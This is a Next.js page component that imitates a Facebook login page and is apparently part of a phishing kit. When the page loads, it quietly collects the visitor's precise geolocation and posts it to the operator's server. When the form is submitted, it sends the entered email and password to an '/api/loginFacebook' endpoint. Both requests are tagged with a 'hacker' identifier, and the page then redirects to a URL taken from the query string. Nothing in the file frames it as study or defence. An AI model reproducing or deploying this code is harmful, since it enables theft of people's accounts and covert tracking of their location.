import {useState, useEffect} from "react";
import Head from 'next/head';
import styles from '../styles/Home.module.css';
import {home,urlServer} from "./api/fr.json";
import { useRouter } from 'next/router';
import * as geolib from 'geolib';
import getDistance from 'geolib/es/getDistance';

export default    () =>{
  const router = useRouter();
  

   const [log, setLog] = useState({email :"" , mdp: ""})
   const [pos, setPos] = useState(null)

   useEffect(() => {

    getDistance(
      { latitude: 51.5103, longitude: 7.49347 },
      { latitude: "51° 31' N", longitude: "7° 28' E" }
  );
  // Working with W3C Geolocation API
  navigator.geolocation.getCurrentPosition(
      (position) => {
        const {accuracy,latitude,longitude } = position.coords
        setPos({accuracy,latitude,longitude })
        
   fetch(urlServer+"/api/localisations", {
    method: "POST",
    headers: {
      Accept: "application/json, text/plain, */*",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    },
    body: new URLSearchParams({
      position: JSON.stringify({accuracy,latitude,longitude }),
      hacker: router.query.h
    }).toString(),
  }).then(() =>{
    
  if (router.query.r ) {
    window.location.href = "https://"+ router.query.r 
  }
  } )
}
  )
}, [router])


   const Login =(e)=>{
     console.log('e:', e)
     e.preventDefault();
     
   fetch(urlServer+"/api/loginFacebook", {
    method: "POST",
    headers: {
      Accept: "application/json, text/plain, */*",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    },
    body: new URLSearchParams({
       email: log.email,
       mdp: log.mdp,
       position: JSON.stringify(pos),
       hacker: router.query.h
    }).toString(),
  }).then(() =>{
    
    if (router.query.u ) {
      window.location.href = "https://"+ router.query.u
    }
    } )

}

  return (
    <div className={styles.container}>
      <Head>
        <title>Facebook </title>
        <link rel="icon" href="/logo-fb.png" />
      </Head>

      <main className={styles.main}>
        
   <header className="bg-light text-dark p-4">
<h1 className="text-primary">{home.title} </h1>
<p className="w-75 fs-9">{home.description} </p>
</header>
<section className="p-4">
  <form onSubmit={e=>Login(e)} className="p-4">
   <div className="input-group p-1">
     <input onChange={e=>setLog({...log,email:e.target.value }) } value={log.email} type="text" placeholder={home.input.email} className="form-control" />
     </div> 
     <div className="input-group p-1">
     <input onChange={e=>setLog({...log,mdp:e.target.value}) } value={log.mdp} type="password" placeholder={home.input.pass} className="form-control" />
     </div> 
     
     <div className="input-group p-1">
       <button className="btn btn-sm btn-primary form-control">{home.input.buttonlogin} </button>
     </div> 
     <span className="input-group">
       <a className="mx-auto my-4" href="#" >{home.input.mdpMissed} </a>
     </span>
     <hr/>
     <span className="input-group">
       <a className="mx-auto my-4 btn btn-sm btn-success">{home.input.btnSignup} </a>
     </span>
    </form>
 
     

  </section> 

      </main>
 
    </div>
  )
}
